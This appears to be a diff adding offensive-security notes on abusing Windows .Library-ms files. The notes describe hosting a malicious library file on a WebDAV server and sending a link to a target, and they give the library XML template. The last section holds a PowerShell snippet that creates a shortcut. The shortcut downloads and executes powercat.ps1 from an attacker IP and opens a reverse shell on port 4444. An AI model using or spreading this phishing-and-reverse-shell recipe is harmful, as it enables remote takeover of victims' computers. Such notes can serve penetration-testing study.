@@ -1,0 +1,53 @@
+# Windows Lib Files
+
+Windows library files are virtual containers for user content.
+They connect users with data stored in remote locations like web services or shares.
+These files have a **.Library-ms** file extension and can be executed by
+double-clicking them in Windows Explorer.
+
+Staging a malicious .Library-ms file on a web server and sending a link to the target.
+You can use WebDAV to host the file on a web server.
+
+Library files consist of three major parts and are written in XML to specify the parameters for accessing remote locations.
+
+The parts are
+
+1.  General library information,
+2.  Library properties, and
+3.  Library locations.
+
+Creating a file with the **.Library-ms** extension and opening it in a text editor reveals the XML structure.
+
+Within the XML structure you can specify the location of the remote file, library display name, and library icon, and other parameters.
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<libraryDescription xmlns="https://schemas.microsoft.com/windows/2009/library">
+<navigationPaneVisible>true</navigationPaneVisible>
+<name>@windows.storage.dll,-34575</name>
+<version>6</version>
+<isLibraryPinned>true</isLibraryPinned>
+<iconReference>%SystemRoot%\system32\imageres.dll,-1002</iconReference>
+<templateInfo>
+<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
+<searchConnectorDescriptionList>
+<searchConnectorDescription>
+<isDefaultSaveLocation>true</isDefaultSaveLocation>
+<isSupported>false</isSupported>
+<simpleLocation>
+<url>https://www.example.com/</url>
+</simpleLocation>
+</searchConnectorDescription>
+</searchConnectorDescriptionList>
+</libraryDescription>
+```
+
+# Windows with Reverse Shell Shortcut
+
+```powershell
+$Shell = New-Object -ComObject WScript.Shell
+$Shortcut = $Shell.CreateShortcut("$Home\Desktop\MyShortcut.lnk")
+$Shortcut.TargetPath = "powershell.exe -c \"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.119.3:8000/powercat.ps1');
+powercat -c 192.168.119.3 -p 4444 -e powershell\""
+$Shortcut.Save()
+```
